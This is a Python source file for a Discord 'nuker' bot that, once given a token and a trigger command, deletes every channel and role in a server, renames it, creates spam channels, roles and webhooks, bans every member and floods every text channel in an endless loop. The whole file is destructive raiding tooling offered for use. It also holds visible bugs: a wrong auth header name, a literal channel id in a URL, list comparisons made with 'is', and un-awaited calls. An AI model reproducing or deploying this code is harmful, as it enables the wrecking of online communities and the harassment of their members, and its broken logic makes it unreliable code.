import os
import discord
from discord.ext import commands
import asyncio
import aiohttp
from colorama import Fore, Back, Style
import json
import random

# ================[ json ]================
with open("config.json") as f:
    config = json.load(f)
# ================[ main variables ]================
token = config["Token"]
ver = "v10"
api = f"https://discord.com/api/{ver}"
head = {
    "Application": f"Bot {token}",
    "Content Type": "application/json"
}
prefix = config["Prefix"]
# ================[ secondary variables ]================
nukechannel = config["ChannelName"]
nukeservname = config["ServerName"]
nukemessage = config["Message"]
amount = config["Amount"]
nukewebhookname = "019203920921"
nukewebhookav = "None"
nukerole = config["RoleName"]
# ================[ ASCII ]================
nempascii = """███╗   ████████████╗   █████████╗███████╗    ███╗   ████╗   ████╗  ███████████████╗ 
████╗  ████╔════████╗ ██████╔══████╔════╝    ████╗  ████║   ████║ ██╔██╔════██╔══██╗
██╔██╗ ███████╗ ██╔████╔████████╔███████╗    ██╔██╗ ████║   ███████╔╝█████╗ ██████╔╝
██║╚██╗████╔══╝ ██║╚██╔╝████╔═══╝╚════██║    ██║╚██╗████║   ████╔═██╗██╔══╝ ██╔══██╗
██║ ╚█████████████║ ╚═╝ ████║    ███████║    ██║ ╚████╚██████╔██║  ███████████║  ██║
╚═╝  ╚═══╚══════╚═╝     ╚═╚═╝    ╚══════╝    ╚═╝  ╚═══╝╚═════╝╚═╝  ╚═╚══════╚═╝  ╚═╝
"""
# ================[ Online Message ]================
bot = commands.Bot(command_prefix=prefix, intents=discord.Intents.all())

@bot.event
async def on_ready():
    os.system("clear")
    print(Fore.RED + nempascii)
    print(Fore.YELLOW + f"Logged in as {bot.user.name} | {bot.user.id}")
    print(Fore.BLUE + "Welcome to the Nemp's Nuker!")
    print(Fore.RESET + "================[Nemp's Nuker V1]================")
# ================[ functions ]================
async def ChanDelete(guild):
    async with aiohttp.ClientSession() as session:
        ren = await session.get(f"{api}/guilds/{guild.id}/channels", headers=head)
        channels = await ren.json()
        tasks = [session.delete(f"{api}/guilds/{guild.id}/channels/c['id']", headers=head) for c in channels]
        responses = await asyncio.gather(*tasks, return_exceptions=True)
        for idx, res in enumerate(responses):
            cname = channels[idx].get("name", "Unknown")
            cid = channels[idx].get("id", "???")

            if isinstance(res, Exception):
                print(f"Failed to delete channel: {cname} | {cid} | {res}")
            else:
                if res.status in [200, 201, 204]:
                    (f"Deleted: {cname} | {cid}")

async def ChanCreate(guild):
    async with aiohttp.ClientSession() as session:
        tasks = [session.post(f"{api}/guilds/{guild.id}/channels", json={"name": random.choice(nukechannel)}, headers=head) for _ in range(amount)]
        response = await asyncio.gather(*tasks, return_exceptions=True)
        if response.status_code is [200, 201, 204]:
            print(f"Successfully created channel!")
        else:
            print(response.status_code)

async def Webhook(guild):
    async with aiohttp.ClientSession() as session:
        r = await session.get(f"{api}/guilds/{guild.id}/channels", headers=head)
        channels = await r.json()
        tasks = [session.post(f"{api}/channels/{c['id']}/webhooks", json={"name": nukewebhookname}, headers=head) for c in channels]
        response = await asyncio.gather(*tasks, return_exceptions=True)
        if response.status_code is [200, 201, 204]:
            print(f"Successfully created webhook!")
        else:
            print(response.status_code)

async def Send(guild):
    async with aiohttp.ClientSession() as session:
        r = await session.get(f"{api}/guilds/{guild.id}/channels", headers=head)
        channels = await r.json()
        text_channels = [c for c in channels if c.get("type") == 0]
        tasks = [session.post(f"{api}/channels/{c['id']}/messages", json={"content": nukemessage}, headers=head) for c in text_channels]
        responses = await asyncio.gather(*tasks, return_exceptions=True)
        for idx, res in enumerate(responses):
            channel_id = text_channels[idx].get("id", "???")
            channel_name = text_channels[idx].get("name", "unknown")
            if isinstance(res, Exception):
                print(f"[ERROR] Failed to send to #{channel_name} ({channel_id}): {res}")
            else:
                if res.status in [200, 201, 204]:
                    print(f" Sent to #{channel_name} ({channel_id})")
                else:
                    print(f" Failed to send to #{channel_name} — HTTP {res.status}")

async def Ban(guild):
    async with aiohttp.ClientSession() as session:
        r = await session.get(f"{api}/guilds/{guild.id}/members", headers=head)
        members = await r.json()

        tasks = [
            session.put(
                f"{api}/guilds/{guild.id}/bans/{m['user']['id']}",
                headers=head
            ) for m in members
        ]
        responses = await asyncio.gather(*tasks, return_exceptions=True)

        for idx, res in enumerate(responses):
            mid = members[idx].get("user", {}).get("id", "???")
            mname = members[idx].get("user", {}).get("username", "Unknown")

            if isinstance(res, Exception):
                print(f"[ERROR] Failed to ban {mname} ({mid}): {res}")
            else:
                if res.status in [200, 201, 204]:
                    print(f"Banned {mname} ({mid})")
                else:
                    print(f"Failed to ban {mname} ({mid}) — HTTP {res.status}")

async def WebSpam(guild, webhook):
    async with aiohttp.ClientSession() as session:
        r = await session.get(f"{api}/guilds/{guild.id}/webhooks", headers=head)
        webhooks = await r.json()
        tasks = [session.post(f"{api}/webhooks/{w['id']}/{w['token']}", json={"content": nukemessage}, headers=head) for w in webhooks]
        response = await asyncio.gather(*tasks, return_exceptions=True)
        if response.status_code is [200, 201, 204]:
            print(f"Successfully ban member!")
        else:
            print(response.status_code)

async def RoleDelete(guild):
    async with aiohttp.ClientSession() as session:
        ren = await session.get(f"{api}/guilds/{guild.id}/roles", headers=head)
        roles = await ren.json()

        tasks = [
            session.delete(f"{api}/guilds/{guild.id}/roles/{r['id']}", headers=head)
            for r in roles
        ]
        responses = await asyncio.gather(*tasks, return_exceptions=True)

        for idx, res in enumerate(responses):
            role_name = roles[idx].get("name", "Unknown")
            role_id = roles[idx].get("id", "???")

            if isinstance(res, Exception):
                print(f"[ERROR] Failed to delete role '{role_name}' ({role_id}): {res}")
            else:
                if res.status in [200, 201, 204]:
                    print(f"[✓] Deleted role '{role_name}' ({role_id})")
                else:
                    print(f"[✗] Failed to delete role '{role_name}' ({role_id}) — HTTP {res.status}")

async def RoleCreate(guild):
    async with aiohttp.ClientSession() as session:
        tasks = [session.post(f"{api}/guilds/{guild.id}/roles", json={"name": random.choice(nukerole)}, headers=head) for _ in range(amount)]
        response = await asyncio.gather(*tasks, return_exceptions=True)
        if response.status_code in [200, 201, 204]:
            print(f"Successfully ban member!")
        else:
            print(response.status_code)

# ============[ Commands ] ============

@bot.command()
async def check(ctx):
    guild = ctx.guild
    async with aiohttp.ClientSession() as session:
        async with session.get(f"{api}/guilds/{guild.id}/webhooks", headers=head) as resp:
            whooklist = await resp.json()
        async with session.get(f"{api}/guilds/{guild.id}/channels", headers=head) as resp:
            chlist = await resp.json()
        async with session.get(f"{api}/guilds/{guild.id}/members", headers=head) as resp:
            mlist = await resp.json()
        async with session.get(f"{api}/guilds/{guild.id}/roles", headers=head) as resp:
            rolelist = await resp.json()

        print("==========[ Server Info ]==========")
        print(f"Server Name: {ctx.guild.name}\nServer ID: {ctx.guild.id}\nServer Owner: {ctx.guild.owner}")
        print("==========[ Essential List ]==========")
        print(Fore.RED + str(whooklist))
        print(Fore.YELLOW + str(chlist))
        print(Fore.MAGENTA + str(mlist))
        print(Fore.BLUE + str(rolelist))

@bot.command()
async def n(ctx):
    guild = ctx.guild
    await guild.edit(name=nukeservname)
    await ChanDelete(guild)
    await asyncio.sleep(0.3)
    await ChanCreate(guild)
    await asyncio.sleep(0.3)
    while True:
        asyncio.sleep(0.3)
        Send(guild)

@bot.command()
async def mb(ctx):
    guild = ctx.guild
    await Ban(guild)
    await asyncio.sleep(0.2)

@bot.command()
async def r(ctx):
    guild = ctx.guild
    await RoleDelete(guild)
    await asyncio.sleep(0.3)
    await RoleCreate(guild)
    await asyncio.sleep(0.3)

@bot.command()
async def c(ctx):
    guild = ctx.guild
    await ChanDelete(guild)
    await asyncio.sleep(0.3)
    await ChanCreate(guild)
    await asyncio.sleep(0.3)

# ============[ Bot Running ]============
bot.run(token)
